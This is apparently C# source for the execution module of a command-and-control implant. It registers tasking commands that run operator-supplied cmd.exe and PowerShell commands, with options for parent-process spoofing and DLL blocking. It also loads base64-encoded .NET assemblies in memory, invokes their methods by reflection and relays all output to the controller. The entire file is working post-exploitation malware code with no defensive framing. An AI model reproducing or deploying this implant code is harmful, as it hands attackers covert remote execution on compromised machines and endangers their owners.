using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace Agent.Modules
{
    public class ExecModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        Assembly CurrentAssembly;
        byte[] CurrentPowerShell;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Exec",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Shell",
                        Delegate = ExecuteShellCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Run",
                        Delegate = ExecuteRunCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PowerShell",
                        Delegate = ExecutePowerShellCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "ImportPowerShell",
                        Delegate = ImportPowerShell
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Assembly",
                        Delegate = ExecuteAssembly
                    },
                    new ModuleInfo.Command
                    {
                        Name = "ImportAssembly",
                        Delegate = ImportAssembly
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Reflection",
                        Delegate = ExecuteReflection
                    }
                }
            };
        }

        void ExecuteShellCommand(string AgentID, AgentTask Task)
        {
            try
            {
                var ppid = Config.Get<int>(AgentConfig.PPID);
                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);

                var arguments = (string)Task.Parameters["Arguments"];

                var lamb = new SacrificialLamb(Config);
                var result = lamb.Shell($"/c {arguments}");

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecuteRunCommand(string AgentID, AgentTask Task)
        {
            try
            {
                var ppid = Config.Get<int>(AgentConfig.PPID);
                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);

                var command = (string)Task.Parameters["Command"];
                var arguments = Task.Parameters["Arguments"];

                if (arguments == null)
                {
                    arguments = string.Empty;
                }

                var lamb = new SacrificialLamb(Config);
                var result = lamb.Run(command, (string)arguments);

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecutePowerShellCommand(string AgentID, AgentTask Task)
        {
            try
            {
                var arguments = (string)Task.Parameters["Arguments"];

                using (var runner = new PowerShellRunner())
                {
                    if (CurrentPowerShell != null && CurrentPowerShell.Length > 0)
                    {
                        runner.ImportScript(Encoding.UTF8.GetString(CurrentPowerShell));
                    }

                    var result = runner.InvokePS(arguments);
                    Agent.SendMessage(result);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecuteAssembly(string AgentID, AgentTask Task)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var arguments = Task.Parameters["Arguments"];
                var asmBytes = Convert.FromBase64String((string)Task.Parameters["Assembly"]);

                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var asm = Assembly.Load(asmBytes);

                if (arguments == null)
                {
                    arguments = new string[] { };
                }
                else
                {
                    arguments = new string[] { arguments as string };
                }

                asm.EntryPoint.Invoke(null, new object[] { arguments });

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        void ImportAssembly(string AgentID, AgentTask Task)
        {
            try
            {
                var asmBytes = Convert.FromBase64String((string)Task.Parameters["Assembly"]);

                CurrentAssembly = Assembly.Load(asmBytes);

                Agent.SendMessage($"Assembly loaded: {CurrentAssembly.FullName}");
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            
        }

        void ExecuteReflection(string AgentID, AgentTask Task)
        {
            try
            {
                if (CurrentAssembly == null)
                {
                    Agent.SendError("Must import an assembly first");
                    return;
                }

                var type = (string)Task.Parameters["Type"];
                var method = (string)Task.Parameters["Method"];
                var args = Task.Parameters["Arguments"];

                var t = CurrentAssembly.GetType(type);

                if (t == null)
                {
                    Agent.SendError($"Could not find type {type} in assembly");
                    return;
                }

                var m = t.GetMethod(method);

                if (m == null)
                {
                    Agent.SendError($"Could not find method {method} in assembly");
                    return;
                }

                string result;

                if (args == null)
                {
                    result = (string)m.Invoke(null, new object[] { });
                }
                else
                {
                    result = (string)m.Invoke(null, new object[] { args });
                }

                Agent.SendMessage(result);

            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ImportPowerShell(string AgentID, AgentTask Task)
        {
            CurrentPowerShell = Convert.FromBase64String((string)Task.Parameters["Script"]);

            Agent.SendMessage($"Imported {CurrentPowerShell.Length} bytes.");
        }
    }
}